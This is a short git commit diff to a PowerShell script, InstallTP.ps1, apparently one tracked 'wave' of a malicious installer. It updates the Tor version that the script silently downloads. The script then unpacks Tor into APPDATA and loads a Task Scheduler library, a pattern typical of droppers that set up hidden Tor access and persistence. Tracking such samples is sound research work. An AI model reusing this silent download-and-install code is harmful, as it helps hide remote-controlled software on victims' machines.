1527ec9ca19a2215f9a2d1544c9a166e9358d568
Corsin Camichel <cocaman@gmail.com>
2017-02-06 20:01:53 +0100

    Wave 2017-02-06

--- InstallTP.ps1
+++ InstallTP.ps1
@@ -65,7 +65,7 @@ $TSAssembly=$Dest+'\v2.0\Microsoft.Win32.TaskScheduler.dll';
 $loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);
 $TFile=$env:Temp+'\t.zip';
 $DestTP=$env:APPDATA+'\TP';
-(New-Object System.Net.WebClient).DownloadFile('https://dist.torproject.org/torbrowser/6.0.7/tor-win32-0.2.8.9.zip',$TFile);
+(New-Object System.Net.WebClient).DownloadFile('https://dist.torproject.org/torbrowser/6.0.8/tor-win32-0.2.8.11.zip',$TFile);
 if ((Test-Path $DestTP) -eq 1){rm -Force -Recurse $DestTP;}md $DestTP | Out-Null;
 Unzip $TFile $DestTP;
 rm -Force $TFile;
